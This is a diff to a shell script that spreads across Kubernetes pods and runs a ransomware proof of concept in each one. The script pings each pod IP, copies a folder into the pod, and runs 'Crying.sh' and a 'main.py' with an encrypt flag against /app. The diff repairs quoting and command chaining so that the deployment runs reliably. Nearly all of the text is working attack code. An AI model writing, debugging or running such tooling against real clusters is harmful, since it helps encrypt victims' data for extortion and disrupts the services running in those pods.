@@ -20,7 +20,7 @@ for IP in $POD_IPS; do
         echo "Ping successful: $IP"
         
         # Get the pod name based on the IP
-        POD_NAME=$(kubectl get pods -o wide --no-headers | grep $IP | awk '{print $1}')
+        POD_NAME=$(kubectl get pods -o wide --no-headers | grep "$IP" | awk '{print $1}')
         
         # Push folder to the pod
         echo "Attempting to push folder to pod $POD_NAME..."
@@ -32,13 +32,14 @@ for IP in $POD_IPS; do
 
         # Execute the script inside the pod
         echo "Executing the script inside the pod $POD_NAME..."
-        kubectl exec "$POD_NAME" -- sh -c chmod +x "/app/Crying/Crying.sh"
-        kubectl exec "$POD_NAME" -- sh -c ./Crying.sh
-        kubectl exec "$POD_NAME" -- sh -c chmod +x "/app/Crying/Ransomeware-poc/main.py
-        kubectl exec "$POD_NAME" -- sh -c python3 main.py -p /app -e || {
-            echo "Failed to execute the script in pod: $POD_NAME"
+        kubectl exec "$POD_NAME" -- sh -c "chmod +x /app/Crying/Crying.sh && /app/Crying/Crying.sh" || {
+            echo "Failed to execute Crying.sh in pod: $POD_NAME"
+            continue
         }
-        echo "Script executed successfully in pod: $POD_NAME"
+        kubectl exec "$POD_NAME" -- sh -c "chmod +x /app/Crying/Ransomeware-poc/main.py && python3 /app/Crying/Ransomeware-poc/main.py -p /app -e" || {
+            echo "Failed to execute main.py in pod: $POD_NAME"
+        }
+        echo "Scripts executed successfully in pod: $POD_NAME"
     else
         echo "Failed to reach IP: $IP"
     fi
